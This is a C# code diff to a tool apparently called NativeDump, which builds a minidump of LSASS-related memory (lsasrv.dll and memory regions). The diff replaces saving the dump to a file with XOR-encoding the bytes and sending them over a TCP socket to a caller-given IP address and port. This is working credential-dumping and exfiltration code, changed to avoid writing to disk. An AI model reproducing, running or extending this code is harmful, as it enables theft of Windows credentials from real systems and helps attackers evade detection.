@@ -4,11 +4,14 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static NativeDump.Win32;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 
 
 namespace NativeDump
 {
-    internal class CreateFile
+    internal class SendFile
     {
         public static byte[] JoinByteArrays(params byte[][] arrays)
         {
@@ -28,7 +31,18 @@ namespace NativeDump
         }
 
 
-        public static void CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, string lsasrv_name, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, string dumpfile, OSVERSIONINFOEX osVersionInfo)
+        public static void SendBytes(string ipAddress, int portNumber, byte[] bytesToSend) {
+            IPAddress serverAddress = IPAddress.Parse(ipAddress);
+            int serverPort = portNumber;
+            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            clientSocket.Connect(new IPEndPoint(serverAddress, serverPort));
+            clientSocket.Send(bytesToSend);
+            clientSocket.Shutdown(SocketShutdown.Both);
+            clientSocket.Close();
+        }
+
+
+        public static void Send(IntPtr lsasrvdll_address, int lsasrvdll_size, string lsasrv_name, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, OSVERSIONINFOEX osVersionInfo, string ipAddress, int portNumber, bool xor_bytes, byte xor_byte)
         {            
             // Header
             MinidumpHeader header = new MinidumpHeader();
@@ -90,19 +104,25 @@ namespace NativeDump
             byte[] moduleListStream_byte_arr = JoinByteArrays(StructToByteArray(moduleListStream), StructToByteArray(dllName));
             byte[] minidumpFile = JoinByteArrays(header_byte_arr, streamDirectory_byte_arr, systemInfoStream_byte_arr, moduleListStream_byte_arr, memory64ListStream_byte_arr, memoryRegions_byte_arr);
 
-            // Save to file
+            // Encoding
+            if (xor_bytes) {
+                for (int i = 0; i < minidumpFile.Length; i++)
+                {
+                    minidumpFile[i] = (byte)(minidumpFile[i] ^ xor_byte);
+                }
+            }
+            
+            // Send file
             try
             {
-                using (FileStream fs = new FileStream(dumpfile, FileMode.Create))
-                {
-                    fs.Write(minidumpFile, 0, minidumpFile.Length);
-                }
-                Console.WriteLine("[+] File " + dumpfile + " created.");
+                SendBytes(ipAddress, portNumber, minidumpFile);
+                Console.WriteLine("[+] File sent.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[-] It was not possible to create the file. Exception message: " + ex.Message);
+                Console.WriteLine("[-] It was not possible to send the file. Exception message: " + ex.Message);
             }
+            
         }
     }
 }
